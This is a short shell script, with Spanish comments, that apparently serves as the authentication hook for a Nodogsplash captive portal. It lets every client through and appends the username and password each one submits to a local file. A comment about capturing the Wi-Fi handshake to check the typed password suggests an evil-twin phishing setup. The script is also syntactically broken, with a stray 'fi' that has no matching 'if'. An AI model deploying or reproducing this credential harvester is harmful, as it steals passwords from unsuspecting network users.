#!/bin/sh

METHOD="$1"
MAC="$2"

case "$METHOD" in
  auth_client)
    USERNAME="$3"
    PASSWORD="$4"
      # Guardamos a un fichero los valores USERNAME y PASSWORD.
      echo 3600 0 0
      
      #
      # Necesario capturar el handsahke para compriabar que la contraseña que meta el usuario sea la correcta.
      #
      
      
      
      echo "$3 $4" >> /etc/nodogsplash/passwords.txt
      exit 0




    fi
    ;;
  client_auth|client_deauth|idle_deauth|timeout_deauth|ndsctl_auth|ndsctl_deauth|shutdown_deauth)
    INGOING_BYTES="$3"
    OUTGOING_BYTES="$4"
    SESSION_START="$5"
    SESSION_END="$6"
    # client_auth: Client authenticated via this script.
    # client_deauth: Client deauthenticated by the client via splash page.
    # idle_deauth: Client was deauthenticated because of inactivity.
    # timeout_deauth: Client was deauthenticated because the session timed out.
    # ndsctl_auth: Client was authenticated by the ndsctl tool.
    # ndsctl_deauth: Client was deauthenticated by the ndsctl tool.
    # shutdown_deauth: Client was deauthenticated by Nodogsplash terminating.
    ;;
esac
